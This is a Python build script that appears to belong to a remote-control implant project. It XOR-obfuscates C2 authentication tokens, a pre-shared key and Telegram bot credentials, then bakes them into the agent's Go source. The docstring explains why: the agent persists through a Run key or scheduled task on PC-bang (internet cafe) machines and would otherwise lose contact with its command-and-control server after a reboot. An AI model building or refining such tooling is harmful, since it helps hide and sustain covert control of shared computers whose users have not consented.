#!/usr/bin/env python3
"""Regenerate xor_secrets.go in a BUILD tree with XOR-obfuscated secrets.

Why: PC방 persistence re-launches the agent at logon (Run key / scheduled
task) and that path loses the C2_SERVER / C2_AUTH_TOKEN / C2_PSK env vars set
by the .cmd wrapper. Without baked values the agent is deaf after the first
reboot. This script bakes them into the build tree only — agent/xor_secrets.go
in the template tree stays EMPTY.

Usage:
  # from config.vultr.env (reads AGENT_TOKEN/C2_AUTH_TOKEN, C2_PSK,
  # TG_BOT_TOKEN, TG_CHAT_ID):
  python3 scripts/bake_secrets.py --env config.vultr.env \
      --out .build/agent/xor_secrets.go

  # explicit values (override env file):
  python3 scripts/bake_secrets.py --token <64hex> --psk <40hex> \
      --tg-token <bot-token> --tg-chat <chat-id> \
      --out .build/agent/xor_secrets.go

Only non-empty values are baked; empty ones keep the template default so the
Go file always compiles.
"""
import argparse
import os
import re
import sys

KEY = b"5159a8c24cb79e045e049989df2e5028"

GO_TEMPLATE = """// Baked agent secrets (XOR-obfuscated with obfKey from xor.go).
// GENERATED by scripts/bake_secrets.py — do not edit by hand, do not copy
// back into the agent/ template tree.
package main

var (
{vars}
)

func bakedAgentToken() string {{ return xob(eBakedAgentToken) }}

func bakedC2PSK() string {{ return xob(eBakedC2PSK) }}
"""


def xor_encode(s: str) -> bytes:
    raw = s.encode("utf-8")
    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(raw)])


def go_literal(enc: bytes) -> str:
    return '[]byte("' + "".join(f"\\x{b:02x}" for b in enc) + '")'


def load_env_file(path):
    vals = {}
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            m = re.match(r'(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*"?([^"\n]*)"?\s*$', line)
            if m:
                vals[m.group(1)] = m.group(2).strip()
    return vals


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--env", help="env file to read (e.g. config.vultr.env)")
    ap.add_argument("--token", help="explicit AGENT token (overrides env file)")
    ap.add_argument("--psk", help="explicit C2 PSK (overrides env file)")
    ap.add_argument("--tg-token", help="explicit Telegram bot token")
    ap.add_argument("--tg-chat", help="explicit Telegram chat id")
    ap.add_argument("--out", required=True, help="output xor_secrets.go path (build tree)")
    args = ap.parse_args()

    vals = {}
    if args.env:
        vals = load_env_file(args.env)

    token = args.token or vals.get("AGENT_TOKEN") or vals.get("C2_AUTH_TOKEN") or ""
    psk = args.psk or vals.get("C2_PSK") or ""
    tg_token = args.tg_token or vals.get("TG_BOT_TOKEN") or ""
    tg_chat = args.tg_chat or vals.get("TG_CHAT_ID") or ""

    out_vars = []
    for name, val in (("eBakedAgentToken", token), ("eBakedC2PSK", psk)):
        if val:
            out_vars.append(f"\t{name} = {go_literal(xor_encode(val))}")
        else:
            out_vars.append(f"\t{name} = []byte(\"\")")
    for name, val in (("eTgBotToken", tg_token), ("eTgChatID", tg_chat)):
        if val:
            out_vars.append(f"\t{name} = {go_literal(xor_encode(val))}")
        else:
            out_vars.append(f"\t{name} = []byte(\"\")")

    src = GO_TEMPLATE.format(vars="\n".join(out_vars))
    out_dir = os.path.dirname(args.out) or "."
    os.makedirs(out_dir, exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as f:
        f.write(src)

    baked = [n for n, v in (("token", token), ("psk", psk), ("tg_token", tg_token), ("tg_chat", tg_chat)) if v]
    print(f"[*] wrote {args.out}")
    print(f"[*] baked (XOR): {', '.join(baked) if baked else 'NOTHING — all empty'}")
    if not token:
        print("[!] WARNING: no agent token baked — agent will refuse to run without env token", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
